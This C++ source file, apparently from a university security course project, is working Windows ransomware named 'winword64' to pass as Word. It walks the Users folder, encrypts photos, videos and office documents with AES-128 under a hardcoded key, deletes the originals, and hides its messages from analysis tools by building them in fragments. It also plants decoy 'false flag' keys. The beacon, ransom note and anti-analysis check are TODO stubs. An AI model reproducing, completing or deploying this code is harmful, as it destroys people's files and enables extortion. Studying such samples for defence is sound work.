// winword64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

//
// The encryption/decryption key is:
//
//    Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy
//
// which is a Base64 encode of "ChrisClarissaSamanthaSkylar"
//

#include <fstream>
#include <string>
#include <iostream>
#include <filesystem>
#include <windows.h>
#include <wincrypt.h>
#include <Shlobj.h>

namespace fs = std::experimental::filesystem;

#define CLASSNAME "uwbcss579";
#define BLOCK_LEN 128;
//#define TRACEOUTPUT // Uncomment define TRACEOUTPUT to enable trace logging output
					  // Comment out define TRACEOUTPUT prior to project submission to 
					  // minimize the strings in the program

bool g_Verbosity = false;
bool g_Decrypt = false;

// Function Declarations
DWORD FindFiles();
DWORD FindEncryptedFiles(std::string decryptionKey);
bool EncryptAndDeleteThisFile(std::string path);
bool DecryptThisFile(std::string path, std::string decryptionKey);
bool ExcludePath(std::string checkString);
bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key);
bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key);
void SendInfectionBeacon(DWORD dwEncryptedFileCount);
void RansomMessage(DWORD dwEncryptedFileCount);
bool AnalysisCheck();
void PrintProgress();
std::string wstrtostr(const std::wstring& wstr);


int main(int argc, char* argv[])
{ 
	std::string keyDecrypt = "";
	std::string Banner = "";
	Banner.append("We").append("lc").append("om").append("e ").append("to").append(" t").append("he").append(" M").append("at").append("ri").append("x!");	// Obfuscating this string
	std::cout << Banner << std::endl;

	DWORD dwEncryptionResult = 0;
	DWORD dwDecryptionResult = 0;

	//
	// Check for debugger, execution in a VM, or other dynamic analysis 
	//
	if (AnalysisCheck())
	{
		// Found evidence of some kind of dynamic analysis
		// Halting program execution - why make it easy on the other teams?? :)
		return 0;
	}

	for (int i = 1; i < argc; ++i) {
		if (std::string(argv[i]) == "/v") 
		{
			g_Verbosity = true;
		}
		else if (std::string(argv[i]) == "/d")
		{
			if (i + 1 < argc)
			{ 
				g_Decrypt = true;

				keyDecrypt = argv[++i];
			}
			else
			{ 
				// There was no key provided with the /d option.

				// Obfuscating the string "You must provide a password with the /d option to continue." from analysis tools
				std::string strPasswordNeeded = "";
				strPasswordNeeded.append("Yo").append("u ").append("mu").append("st").append(" p").append("ro").append("vi").append("de").append(" a").append(" p").append("as").append("sw").append("or").append("d ").append("wi").append("th").append(" t").append("he").append(" /").append("d ").append("op").append("ti").append("on").append(" t").append("o ").append("co").append("nt").append("in").append("ue").append(".");
				std::cout << strPasswordNeeded << std::endl;

				//std::cout << "You must provide a password with the /d option to continue." << std::endl;
				return 0;  // Halt program exection
			}
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Verbosity:  Enabled" << std::endl;
		std::cout << "Operation:  " << g_Decrypt << "  [1: Decrypt; 0: Encrypt]" << std::endl;
		std::cout << "keyDecrypt: " << keyDecrypt << std::endl;
		std::cout << std::endl;
	}
#endif

	// Encrypt or Decrypt files?
	if (!g_Decrypt)
	{
		PrintProgress();

		// Finds, Encrypts, and Deletes important personal files
		dwEncryptionResult = FindFiles();

		if (dwEncryptionResult == -25)
		{
			// Couldn't find the Users directory 
			return 0; // Halt program exection
		}

		// Send network beacon to report ransom/encryption completed
		SendInfectionBeacon(dwEncryptionResult);

		// Display message to user demanding bitcoin payment for decryption key
		RansomMessage(dwEncryptionResult);
	}
	else
	{
		// Finds .encrypted files, and decrypts them

		std::string strPwdMessage = "";
		strPwdMessage.append("Yo").append("u ").append("en").append("te").append("re").append("d ").append("th").append("e ").append("pa").append("ss").append("wo").append("rd").append(": ");

		std::cout << strPwdMessage << keyDecrypt << std::endl;
		//std::cout << "You entered the password: " << keyDecrypt << std::endl;// << std::endl;

		PrintProgress();

		dwDecryptionResult = FindEncryptedFiles(keyDecrypt);
		if (dwDecryptionResult > 0)
		{
			// Obfuscating the string "] files failed to recover.  Rerun the program with your password." from analysis tools
			std::string strRecoveryFailed = "";
			strRecoveryFailed.append("] ").append("fi").append("le").append("s ").append("fa").append("il").append("ed").append(" t").append("o ").append("re").append("co").append("ve").append("r.").append(" R").append("er").append("un").append(" t").append("he").append(" p").append("ro").append("gr").append("am").append(" w").append("it").append("h ").append("yo").append("ur").append(" p").append("as").append("sw").append("or").append("d.");
			
			std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << strRecoveryFailed << std::endl;

			//std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << "] files failed to recover.  Rerun the program with your password." << std::endl;
			//std::cout << "< " << std::dec << dwDecryptionResult << " > files failed to recover.  Rerun the program with your password." << " [0x" << std::hex << dwDecryptionResult << "]" << std::endl;
		}
	}


	// End with a fun message
	if (!g_Decrypt)
	{
		// Obfuscating the string "All Your Files Are Belong To Us!!! :\\" from analysis tools
		std::string strAllYourFilesAreBelongToUs = "";
		strAllYourFilesAreBelongToUs.append("Al").append("l ").append("Yo").append("ur").append(" F").append("il").append("es").append(" A").append("re").append(" B").append("el").append("on").append("g ").append("To").append(" U").append("s!").append("!! ").append(":\\");
		std::cout << std::endl << strAllYourFilesAreBelongToUs << std::endl;
		//std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
	}
	else
	{
		if (dwDecryptionResult > 0)
		{
			// Obfuscating the string "Not All Your Files Are Belong To You!!! :<" from analysis tools
			std::string strNotAllYourFilesAreBelongToYou = "";
			strNotAllYourFilesAreBelongToYou.append("No").append("t ").append("Al").append("l ").append("Yo").append("ur").append(" F").append("il").append("es").append(" A").append("re").append(" B").append("el").append("on").append("g ").append("To").append(" Y").append("ou").append("!!!").append(" :<");
			std::cout << std::endl << strNotAllYourFilesAreBelongToYou << std::endl;
			//std::cout << std::endl << "Not All Your Files Are Belong To You!!! :<" << std::endl;
		}
		else
		{
			// Obfuscating the string "All Your Files Are Belong To You!!! :>" from analysis tools
			std::string strAllYourFilesAreBelongToYou = "";
			strAllYourFilesAreBelongToYou.append("Al").append("l ").append("Yo").append("ur").append(" F").append("il").append("es").append(" A").append("re").append(" B").append("el").append("on").append("g ").append("To").append(" Y").append("ou").append("!!!").append(" :<");
			std::cout << std::endl << strAllYourFilesAreBelongToYou << std::endl;
			//std::cout << std::endl << "All Your Files Are Belong To You!!! :>" << std::endl;
		}
	}
}

//
// Supporting functions
//

bool AnalysisCheck()
{
	// TODO: Add code to check for a debugger, execution in a VM, or other dynamic analysis indicators

	// Returning TRUE will halt program execution
	// Returning FALSE will allow program execution to proceed

	return false; // stubbed for now allow execution
}

void SendInfectionBeacon(DWORD dwEncryptedFileCount)
{
	// TODO: Add code to send an infection beacon to a website, twitter, 
	//       slack, email, or some other network destination to track infections
	//
	// Beacon data could include machinename, username, # files encrypted, etc
}

void RansomMessage(DWORD dwEncryptedFileCount)
{
	// TODO: Add code to display a ransom message to the user, and to 
	//       demand bitcoin payment to get the decryption key
	//
	// This could be a MessageBox or a HTML page
	//
	// The message text should be encoded (base64) if stored in the code,
	// or it could be downloaded from a remote site
}

void PrintProgress()
{
	Sleep(150);
	for (int i = 0; i < 6; i++)
	{
		std::cout << ".";
		Sleep(150);
	}
	std::cout << "." << std::endl;
}

bool ExcludePath(std::string checkString)
{
	std::string AppData = "AppData";
	std::string AllUsers = "All Users";
	std::string Public = "Public\\AccountPictures";

	if (checkString.find(AppData) != std::string::npos)
	{
		// Exclude files in the AppData directory
		return true;
	}
	else if (checkString.find(AllUsers) != std::string::npos)
	{
		// Exclude files in the All Users directory
		return true;
	}
	else if (checkString.find(Public) != std::string::npos)
	{
		// Exclude files in the Public\AccountPictures directory
		return true;
	}
	else
	{
		// Do not exclude this path
		return false;
	}
}

bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key)
{

	// Note: the param 'key' is not used anywhere - it is a false flag

	wchar_t keyDefault0[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
	wchar_t keyDefault1[] = L"Tm90TXlNb25rZXlzTm90TXlDaXJjdXM="; // false flag key
	wchar_t keyDefault2[] = L"VVcgQ1NTIDU3OSBUZWFtIFByb2plY3Q="; // false flag key
	wchar_t keyDefault3[] = L"Q2xhcmlzc2FTYW1hbnRoYVNreWxhckNocmlz"; // false flag key
	wchar_t keyDefault4[] = L"U2FtYW50aGFTa3lsYXJDaHJpc0NsYXJpc3Nh"; // false flag key
	wchar_t keyDefault5[] = L"U2t5bGFyQ2hyaXNDbGFyaXNzYVNhbWFudGhh"; // false flag key

	wchar_t* keyString = keyDefault0;
	DWORD keyLength = lstrlenW(keyString);

	// Converting filenames to LPCWSTRs for easier processing wiht CryptoAPIs
	LPCWSTR inputFile = std::wstring(fileToEncrypt.begin(), fileToEncrypt.end()).c_str();
	LPCWSTR outputFile = std::wstring(fileEncrypted.begin(), fileEncrypted.end()).c_str();

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::wcout << "Key:         " << keyDefault0 << std::endl;
		std::cout << "Key (addr):  " << keyString << std::endl;
		std::cout << "Key length:  " << keyLength << std::endl;
		std::cout << "Input file:  " << fileToEncrypt.c_str() << std::endl;
		std::cout << "Output file: " << fileEncrypted.c_str() << std::endl;
	}
#endif

	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open input file!" << std::endl;
#endif

		return false;
	}

	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open output file!" << std::endl;
#endif

		return false;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hCryptProvider;

	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	HCRYPTHASH hCryptHash;
	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
	{
		DWORD err = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptHashData Success! " << std::endl;

	HCRYPTKEY hCryptKey;
	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptDeriveKey Success! " << std::endl;

	const size_t chunkSize = BLOCK_LEN;
	BYTE chunk[chunkSize] = { 0 };
	DWORD outputLength = 0;
	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInputFile, NULL);

	while (bResult = ReadFile(hInputFile, chunk, chunkSize, &outputLength, NULL))
	{
		if (0 == outputLength)
		{
			break;
		}

		readTotalSize += outputLength;

		if (readTotalSize == inputSize)
		{
			isFinal = TRUE;
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Finalizing encrypted data file." << std::endl;
#endif
		}

		// Encrypt data
		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength, chunkSize))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "CryptEncrypt failed :(" << std::endl;
#endif

			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "WriteFile(output file) failed :(" << std::endl;
#endif

			break;
		}

		memset(chunk, 0, chunkSize);
	}

	CryptReleaseContext(hCryptProvider, 0);
	CryptDestroyKey(hCryptKey);
	CryptDestroyHash(hCryptHash);
	CloseHandle(hInputFile);
	CloseHandle(hOutputFile);

	return true;
}

bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key)
{

	// Note: the param 'key' is the actual key used for file decryption !!
	
	LPCWSTR keyString = std::wstring(key.begin(), key.end()).c_str();
	DWORD keyLength = lstrlenW(keyString);

	// Converting filenames to LPCWSTRs for easier processing wiht CryptoAPIs
	LPCWSTR inputFile = std::wstring(fileToDecrypt.begin(), fileToDecrypt.end()).c_str();
	LPCWSTR outputFile = std::wstring(fileRestored.begin(), fileRestored.end()).c_str();

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::wcout << "Key:         " << key.c_str() << std::endl;
		std::cout << "Key (addr):  " << keyString << std::endl;
		std::cout << "Key length:  " << keyLength << std::endl;
		std::cout << "Input file:  " << fileToDecrypt.c_str() << std::endl;
		std::cout << "Output file: " << fileRestored.c_str() << std::endl;
	}
#endif

	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open input file!" << std::endl;
#endif

		return false;
	}

	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open output file!" << std::endl;
#endif

		return false;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hCryptProvider;

	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	HCRYPTHASH hCryptHash;
	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
	{
		DWORD err = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptHashData Success! " << std::endl;

	HCRYPTKEY hCryptKey;
	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptDeriveKey Success! " << std::endl;

	const size_t chunkSize = BLOCK_LEN;
	BYTE chunk[chunkSize] = { 0 };
	DWORD outputLength = 0;
	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInputFile, NULL);
	bool retValue = true;

	while (bResult = ReadFile(hInputFile, chunk, chunkSize, &outputLength, NULL))
	{
		if (0 == outputLength)
		{
			break;
		}

		readTotalSize += outputLength;

		if (readTotalSize == inputSize)
		{
			isFinal = TRUE;
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Finalizing decrypted data file." << std::endl;
#endif
		}

		// Decrypt data
		if (!CryptDecrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
			{
				std::cout << "CryptDecrypt  failed :(" << std::endl;
				DWORD dwStatus;
				dwStatus = GetLastError();

				LPVOID lpMsgBuf;
				FormatMessage(
					FORMAT_MESSAGE_ALLOCATE_BUFFER |
					FORMAT_MESSAGE_FROM_SYSTEM |
					FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL,
					dwStatus,
					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
					(LPTSTR)& lpMsgBuf,
					0, NULL);

				std::cout << "CryptDecrypt status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
				std::wcout << "CryptDecrypt error:  " << (LPTSTR)lpMsgBuf;
			}
#endif

			retValue = false;
			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "WriteFile(output file) failed :(" << std::endl;
#endif

			retValue = false;
			break;
		}

		memset(chunk, 0, chunkSize);
	}

	CryptReleaseContext(hCryptProvider, 0);
	CryptDestroyKey(hCryptKey);
	CryptDestroyHash(hCryptHash);
	CloseHandle(hInputFile);
	CloseHandle(hOutputFile);

	return retValue;
}

bool EncryptAndDeleteThisFile(std::string path)
{
#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << "Encrypting " << path << " ..." << std::endl;
#endif

	bool fEncrypted = false;
	bool fDeleted = false;

	std::string pathEncrypted = path;
	pathEncrypted.append(".en").append("cr").append("yp").append("t").append("ed");
	//pathEncrypted.append(".encrypted");

	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");

#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << "Encrypt result: " << fEncrypted << std::endl;
#endif

	if (fEncrypted)
	{
		// Only delete original file if Encryption succeeded 

		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
		if (!fDeleted)
		{
			DWORD dwStatus;
			dwStatus = GetLastError();
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif
		}
		else
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Delete result:  " << fDeleted << std::endl;
#endif
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << std::endl;
#endif

	if (fEncrypted)
		return true;
	else
		return false;
}

bool DecryptThisFile(std::string path, std::string decryptionKey)
{
#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << "Decrypting " << path << " ..." << std::endl;
#endif

	bool fDecrypted = false;
	bool fDeleted = false;

	std::string pathRestoreTargetFile = path;
	pathRestoreTargetFile.erase(pathRestoreTargetFile.end() - 10, pathRestoreTargetFile.end());

	fDecrypted = Decryptor(path, pathRestoreTargetFile, decryptionKey);

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Decryption result: " << fDecrypted << std::endl;
		std::cout << "Restored file:  " << pathRestoreTargetFile << std::endl;
	}
#endif

	if (fDecrypted)
	{
		// Only delete encrypted file if Decryption succeeded 

		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
		if (!fDeleted)
		{
			DWORD dwStatus;
			dwStatus = GetLastError();
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif
		}
		else
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Delete result:  " << fDeleted << std::endl;
#endif
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << std::endl;
#endif

	if (fDecrypted)
		return true;
	else
		return false;
}

DWORD FindFiles()
{
	// Get system drive

	DWORD dwFileCounter = 0;
	DWORD dwEncryptionCounter = 0;

	// File extension filters to target important files
	// Using lowercase extenstions
	const std::string bmp = ".bmp";
	const std::string jpg = ".jpg";
	const std::string jpeg = ".jpeg";
	const std::string png = ".png";
	const std::string gif = ".gif";
	const std::string mp4 = ".mp4";
	const std::string mpg = ".mpg";
	const std::string mpeg = ".mpeg";
	const std::string mov = ".mov";
	const std::string mp3 = ".mp3";
	const std::string m4a = ".m4a";
	const std::string doc = ".doc";
	const std::string docx = ".docx";
	const std::string xls = ".xls";
	const std::string xlsx = ".xlsx";
	const std::string ppt = ".ppt";
	const std::string pptx = ".pptx";
	const std::string pdf = ".pdf";
	const std::string txt = ".txt";

	
	// Restricting search path to the Users directory
	std::string path = ""; // c:\\users
	// Get the Users directory from the system
	PWSTR pszUsersFolder = NULL;
	HRESULT hr = S_OK;
	hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_UserProfiles, 0, NULL, &pszUsersFolder);
	if (!FAILED(hr))
	{
		// Found the Users directory, save it 
		path = wstrtostr(pszUsersFolder);
		CoTaskMemFree(pszUsersFolder);

#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Users directory:  " << path << std::endl;
		}
#endif
	}
	else
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Get Users directory failed:  " << std::hex << hr << std::endl;
		}
#endif

		return -25;
	}


	std::string tempExt;

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path by terminating the current loop iteration
		}

		// Convert extention to lowercase for later comparison
		tempExt = entry.path().extension().string();
		std::transform(tempExt.begin(), tempExt.end(), tempExt.begin(), ::tolower);

		if (tempExt == jpg ||
			tempExt == jpeg ||
			tempExt == png ||
			tempExt == gif ||
			tempExt == mp4 ||
			tempExt == mpg ||
			tempExt == mpeg ||
			tempExt == mov ||
			tempExt == mp3 ||
			tempExt == m4a ||
			tempExt == bmp ||
			tempExt == doc ||
			tempExt == docx ||
			tempExt == xls ||
			tempExt == xlsx ||
			tempExt == ppt ||
			tempExt == pptx ||
			tempExt == pdf ||
			tempExt == txt
			)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Encrypt file
			if (EncryptAndDeleteThisFile(entry.path().string()))
			{
				dwEncryptionCounter++;
			}
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Total files found:     " << dwFileCounter << std::endl;
		std::cout << "Total files encrypted: " << dwEncryptionCounter << std::endl;
	}
#endif

	return dwEncryptionCounter; // dwFileCounter;
}

DWORD FindEncryptedFiles(std::string decryptionKey)
{
	// Get system drive

	DWORD dwFileCounter = 0;
	DWORD dwDecryptionCounter = 0;

	// File extension filter to target encrypted files
	// Using lowercase extenstions
	//const std::string encrypted = ".encrypted";
	std::string encrypted = "";
	encrypted.append(".en").append("cr").append("yp").append("t").append("ed");

	// Restricting search path to the Users directory
	std::string path = ""; // c:\\users
	// Get the Users directory from the system
	PWSTR pszUsersFolder = NULL;
	HRESULT hr = S_OK;
	hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_UserProfiles, 0, NULL, &pszUsersFolder);
	if (!FAILED(hr))
	{
		path = wstrtostr(pszUsersFolder);
		CoTaskMemFree(pszUsersFolder);

#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Users directory:  " << path << std::endl;
		}
#endif
	}
	else
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Get Users directory failed:  " << std::hex << hr << std::endl;
		}
#endif

		return -25;
	}

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path by terminating the current loop iteration 
		}

		if (entry.path().extension() == encrypted)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Decrypt file
			if (DecryptThisFile(entry.path().string(), decryptionKey))
			{
				dwDecryptionCounter++;
			}
			else
			{
				std::cout << " : " << entry.path().string() << std::endl;
			}
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Total files found:     " << std::dec << dwFileCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
		std::cout << "Total files decrypted: " << std::dec << dwDecryptionCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
	}
#endif

	return dwFileCounter - dwDecryptionCounter;  // if > 0, then files failed to decrypt
}

std::string wstrtostr(const std::wstring& wstr)
{
	// Convert a PWSTR to a std::string

	std::string strNewStdString;
	char* szTmp = new char[wstr.length() + 1];
	szTmp[wstr.size()] = '\0';
	WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, szTmp, (int)wstr.length(), NULL, NULL);
	strNewStdString = szTmp;
	delete[] szTmp;
	return strNewStdString;
}

